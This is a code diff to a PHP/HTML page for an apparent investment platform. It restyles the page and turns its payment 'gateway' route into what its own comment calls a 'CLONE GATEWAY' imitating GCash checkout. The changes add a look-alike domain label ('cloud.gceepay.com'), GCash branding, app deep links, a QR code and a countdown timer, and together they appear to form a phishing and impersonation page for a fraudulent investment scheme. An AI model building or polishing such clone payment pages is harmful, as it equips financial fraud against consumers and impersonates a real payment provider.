@@ -284,12 +284,12 @@ if ($currentUser && isset($db['transactions'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ApexVest | Investment Platform</title>
+    <title>Gcash - cloud.gceepay.com</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #071913; color: #f8fafc; margin: 0; padding-bottom: 80px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f1f5f9; color: #1e293b; margin: 0; padding-bottom: 80px; }
         .container { max-width: 480px; margin: 0 auto; padding: 15px; }
         .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; font-size: 14px; color: #94a3b8; }
-        .balance-card { background: linear-gradient(135deg, #0b2e21, #0f3d2c); padding: 20px; border-radius: 14px; border: 1px solid #145332; margin-bottom: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.4); }
+        .balance-card { background: linear-gradient(135deg, #0b2e21, #0f3d2c); padding: 20px; border-radius: 14px; border: 1px solid #145332; margin-bottom: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.4); color: #f8fafc; }
         .balance-title { font-size: 13px; color: #94a3b8; }
         .balance-amount { font-size: 32px; font-weight: bold; color: #facc15; margin-top: 5px; }
         .sub-stats { display: flex; gap: 10px; margin-top: 15px; }
@@ -301,9 +301,9 @@ if ($currentUser && isset($db['transactions'])) {
         .menu-item { background: #0f3d2c; padding: 12px 5px; border-radius: 12px; border: 1px solid #165b41; cursor: pointer; color: #f8fafc; font-size: 11px; text-decoration: none; }
         .menu-item svg { width: 22px; height: 22px; fill: #facc15; margin-bottom: 4px; display: block; margin: 0 auto 4px auto; }
         
-        .section-title { font-size: 16px; font-weight: bold; margin: 20px 0 10px 0; color: #f8fafc; display: flex; justify-content: space-between; align-items: center; }
+        .section-title { font-size: 16px; font-weight: bold; margin: 20px 0 10px 0; color: #0f172a; display: flex; justify-content: space-between; align-items: center; }
         
-        .plan-card { background: #0b2e21; border-radius: 14px; border: 1px solid #145332; overflow: hidden; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+        .plan-card { background: #0b2e21; border-radius: 14px; border: 1px solid #145332; overflow: hidden; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); color: #fff; }
         .plan-body { padding: 15px; }
         .yield-tag { display: inline-block; background: #facc15; color: #071913; font-weight: bold; padding: 4px 10px; border-radius: 20px; font-size: 12px; margin-bottom: 8px; }
         .plan-name { font-size: 18px; font-weight: bold; color: #fff; margin-bottom: 4px; }
@@ -318,18 +318,18 @@ if ($currentUser && isset($db['transactions'])) {
         .nav-link.active { color: #facc15; }
         .nav-link svg { width: 20px; height: 20px; fill: currentColor; margin: 0 auto 2px auto; display: block; }
         
-        .card { background: #0b2e21; padding: 15px; border-radius: 12px; border: 1px solid #145332; margin-bottom: 15px; }
+        .card { background: #0b2e21; padding: 15px; border-radius: 12px; border: 1px solid #145332; margin-bottom: 15px; color: #fff; }
         input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #165b41; background: #071913; color: white; box-sizing: border-box; }
         .alert { padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-size: 13px; }
         .alert-error { background: #7f1d1d; color: #fca5a5; }
         .alert-success { background: #145332; color: #86efac; }
         
         .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); z-index: 2000; justify-content: center; align-items: flex-end; }
-        .modal-content { background: #0b2e21; width: 100%; max-width: 480px; border-radius: 20px 20px 0 0; padding: 20px; border-top: 2px solid #facc15; box-sizing: border-box; max-height: 85vh; overflow-y: auto; }
+        .modal-content { background: #0b2e21; width: 100%; max-width: 480px; border-radius: 20px 20px 0 0; padding: 20px; border-top: 2px solid #facc15; box-sizing: border-box; max-height: 85vh; overflow-y: auto; color: #fff; }
         
         /* Notice Popup Modal */
         .notice-modal { display: flex; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 3000; justify-content: center; align-items: center; }
-        .notice-box { background: linear-gradient(135deg, #0b2e21, #0f3d2c); width: 85%; max-width: 340px; border-radius: 20px; padding: 25px 20px; border: 1px solid #165b41; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .notice-box { background: linear-gradient(135deg, #0b2e21, #0f3d2c); width: 85%; max-width: 340px; border-radius: 20px; padding: 25px 20px; border: 1px solid #165b41; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5); color: #fff; }
         .notice-icon { background: #facc15; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px auto; }
         .notice-icon svg { width: 26px; height: 26px; fill: #071913; }
         .close-btn { position: absolute; top: 15px; right: 15px; background: rgba(255,255,255,0.1); border: none; color: #fff; width: 28px; height: 28px; border-radius: 50%; cursor: pointer; font-weight: bold; }
@@ -342,7 +342,7 @@ if ($currentUser && isset($db['transactions'])) {
         .amount-chip { background: #071913; border: 1px solid #165b41; padding: 10px 5px; border-radius: 8px; text-align: center; cursor: pointer; color: #fff; font-size: 13px; font-weight: bold; }
         .amount-chip.selected { background: #facc15; color: #071913; border-color: #facc15; }
         
-        .history-card { background: #071913; border: 1px solid #145332; padding: 12px; border-radius: 10px; margin-bottom: 10px; font-size: 12px; }
+        .history-card { background: #071913; border: 1px solid #145332; padding: 12px; border-radius: 10px; margin-bottom: 10px; font-size: 12px; color: #fff; }
         .status-badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: bold; text-transform: uppercase; float: right; }
         .status-pending { background: #d97706; color: #fff; }
         .status-approved, .status-completed { background: #22c55e; color: #fff; }
@@ -429,42 +429,45 @@ if ($currentUser && isset($db['transactions'])) {
         <?php endif; ?>
 
     <?php elseif (isset($_GET['route']) && $_GET['route'] === 'gateway'): ?>
-        <!-- PRO GCASH SECURE CHECKOUT GATEWAY WITH DIRECT APP INTENT -->
+        <!-- CLOUD GCEEPAY CLONE GATEWAY -->
         <?php 
             $gatewayAmt = $_GET['amount'] ?? 300;
             $totalPayAmt = $gatewayAmt + 4.99; 
             $gatewayMethod = $_GET['method'] ?? 'GCash';
             $txnId = $_GET['txn'] ?? 'PAY-TEST';
         ?>
-        <div style="background: #f1f5f9; min-height: 100vh; margin: -15px; padding-bottom: 50px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
-            
-            <div style="background: #1b6ef3; padding: 20px 15px; color: #fff; text-align: center;">
+        <div style="background: #f1f5f9; min-height: 100vh; margin: -15px; padding-bottom: 50px; color: #1e293b;">
+            <!-- Blue Header with cloud branding -->
+            <div style="background: #1b6ef3; padding: 20px 15px; color: #fff; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                 <div style="font-size: 20px; font-weight: 800; display: flex; align-items: center; justify-content: center; gap: 8px;">
                     <span style="background: #fff; color: #1b6ef3; padding: 2px 8px; border-radius: 4px; font-size: 14px;">G</span> <?= htmlspecialchars($gatewayMethod) ?>
                 </div>
+                <div style="font-size: 11px; opacity: 0.8; margin-top: 4px;">cloud.gceepay.com</div>
             </div>
 
-            <div style="max-width: 440px; margin: 20px auto; background: #ffffff; border-radius: 12px; padding: 25px 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); color: #1e293b;">
+            <div style="max-width: 440px; margin: 20px auto; background: #ffffff; border-radius: 12px; padding: 25px 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05);">
                 <p style="text-align: center; color: #64748b; font-size: 13px; margin-bottom: 20px; font-weight: 500;">
                     Securely complete the payment with your <?= htmlspecialchars($gatewayMethod) ?> App
                 </p>
 
-                <!-- DIRECT GCASH APP DEEP LINK / INTENT URL -->
-                <a href="intent://#Intent;scheme=gcash;package=com.globe.gcash.android;end" onclick="window.location.href='gcash://app';" style="display: block; background: #1b6ef3; color: #fff; text-align: center; padding: 16px; border-radius: 30px; font-weight: bold; font-size: 15px; text-decoration: none; box-shadow: 0 4px 12px rgba(27,110,243,0.3); margin-bottom: 25px;">
+                <!-- Open in App Button -->
+                <a href="gcash://app" onclick="window.location.href='intent://#Intent;scheme=gcash;package=com.globe.gcash.android;end';" style="display: block; background: #1b6ef3; color: #fff; text-align: center; padding: 16px; border-radius: 30px; font-weight: bold; font-size: 15px; text-decoration: none; box-shadow: 0 4px 12px rgba(27,110,243,0.3); margin-bottom: 25px;">
                     Open in <?= htmlspecialchars($gatewayMethod) ?>
                 </a>
 
-                <div style="text-align: center; color: #64748b; font-size: 12px; margin-bottom: 25px;">
-                    or Login to <?= htmlspecialchars($gatewayMethod) ?> and scan this QR with the QR Scanner
+                <div style="text-align: center; color: #64748b; font-size: 12px; margin-bottom: 25px; position: relative;">
+                    <span style="background: #fff; padding: 0 10px; position: relative; z-index: 1;">or Login to <?= htmlspecialchars($gatewayMethod) ?> and scan this QR with the QR Scanner</span>
+                    <hr style="border: none; border-top: 1px solid #e2e8f0; margin-top: -8px;">
                 </div>
 
+                <!-- QR Code Box -->
                 <div style="text-align: center; margin-bottom: 25px;">
-                    <div style="background: #fff; padding: 12px; display: inline-block; border-radius: 12px; border: 1px solid #e2e8f0;">
-                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=<?= urlencode('https://gcash.com/pay?amount='.$gatewayAmt) ?>" alt="Payment QR" style="display: block;">
+                    <div style="background: #fff; padding: 12px; display: inline-block; border-radius: 12px; border: 1px solid #e2e8f0; box-shadow: 0 2px 8px rgba(0,0,0,0.05);">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=<?= urlencode('https://gcash.com/pay?amount='.$gatewayAmt) ?>" alt="Payment QR" style="display: block; border-radius: 6px;">
                     </div>
                 </div>
 
-                <!-- PAYMENT BREAKDOWN -->
+                <!-- Payment Breakdown Box -->
                 <div style="background: #f8fafc; border-radius: 10px; padding: 15px; margin-bottom: 20px; border: 1px solid #e2e8f0;">
                     <div style="display: flex; justify-content: space-between; font-size: 13px; color: #64748b; margin-bottom: 8px;">
                         <span>Amount Due</span>
@@ -487,7 +490,7 @@ if ($currentUser && isset($db['transactions'])) {
             </div>
 
             <!-- COUNTDOWN TIMER FLOATING BADGE -->
-            <div id="paymentTimeoutBadge" style="position: fixed; bottom: 20px; right: 20px; background: #1b6ef3; color: #ffffff; padding: 10px 18px; border-radius: 20px; font-weight: bold; font-size: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); z-index: 9999;">
+            <div id="paymentTimeoutBadge" style="position: fixed; bottom: 20px; right: 20px; background: #1b6ef3; color: #ffffff; padding: 12px 20px; border-radius: 30px; font-weight: bold; font-size: 13px; box-shadow: 0 4px 15px rgba(27,110,243,0.4); z-index: 9999;">
                 Payment Timeout : <span id="timerCountdown">15:00</span>
             </div>
         </div>
